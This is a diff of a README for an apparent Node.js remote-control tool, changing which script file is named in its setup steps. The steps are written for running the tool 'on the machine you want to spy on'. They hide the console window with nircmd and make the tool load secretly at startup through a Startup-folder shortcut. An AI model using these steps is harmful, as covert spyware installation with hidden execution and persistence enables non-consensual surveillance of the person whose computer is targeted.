@@ -2,11 +2,11 @@
 ### How to use
 1. Download the **Windows Binary** for **node**. And extract it.
 2. Copy the files from the **Repo** to the folder where you extracted node.
-3. Run the `rmtCtrlServer.js` file using **node** on the machine you want to spy on.
-     - To hide the console, make a `.bat` with a command to run `node.exe rmtCtrlServer.js`.
+3. Run the `rmtCtrlClient.js` file using **node** on the machine you want to spy on.
+     - To hide the console, make a `.bat` with a command to run `node.exe rmtCtrlClient.js`.
        Then run the said `.bat` file with `nircmd.exe` using the following arguments `exec hide`.
        The whole this should look like this.
-        - `.bat` -> `node.exe rmtCtrlServer.js`
+        - `.bat` -> `node.exe rmtCtrlClient.js`
         - `on cmd` -> `nircmd.exe exec hide "[filename].bat"`
      - To make it load secretly on **startup**, make another `.bat` with the `nircmd` command, and create a shortcut for it.
        Copy the shortcut to the `Startup` directory.
